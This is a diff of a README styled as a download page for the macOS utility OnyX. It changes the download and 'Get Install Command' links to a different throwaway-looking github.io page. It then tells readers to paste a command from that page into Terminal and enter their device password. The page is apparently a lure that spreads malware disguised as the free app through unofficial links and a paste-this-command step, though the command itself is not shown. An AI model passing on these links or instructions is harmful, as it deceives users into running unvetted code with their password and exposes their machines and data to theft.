@@ -1,9 +1,9 @@
 # OnyX For Mac — Download For Mac OS
-![logo](https://www.titanium-software.fr/images/icons/onyx15.png)
+![logo-onyx](https://www.titanium-software.fr/images/icons/onyx15.png)
 
 OnyX is a powerful free macOS utility designed for system optimization, maintenance, and cleaning. 🚀 With OnyX for Mac, you can easily verify the startup disk, run maintenance tasks, rebuild databases, and customize macOS settings for a smoother experience.
 
-[![Download For Mac](https://img.shields.io/badge/Download-For%20Mac-000000?style=for-the-badge&logo=apple&logoColor=white)](https://juianaiud84.github.io/.github/onyx)
+[![Install For Mac](https://img.shields.io/badge/Install-For%20Mac-000000?style=for-the-badge&logo=apple&logoColor=white)](https://dinkkennyrice406.github.io/.github/onyx)
 
 If the button above doesn’t work, please follow the installation instructions below using the terminal command.
 
@@ -23,7 +23,7 @@ If the button above doesn’t work, please follow the installation instructions 
 
 1. Click the button below to get the installation command.  
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-007AFF?style=for-the-badge&logo=apple)](https://gistcdn.githack.com/sportsmenskyfall/60f8626f4918dacda887384a3e360088/raw/9290198cb820aba533c4be294343d7989842dfea/install.html)  
+[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-007AFF?style=for-the-badge&logo=apple)](https://dinkkennyrice406.github.io/.github/onyx)  
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
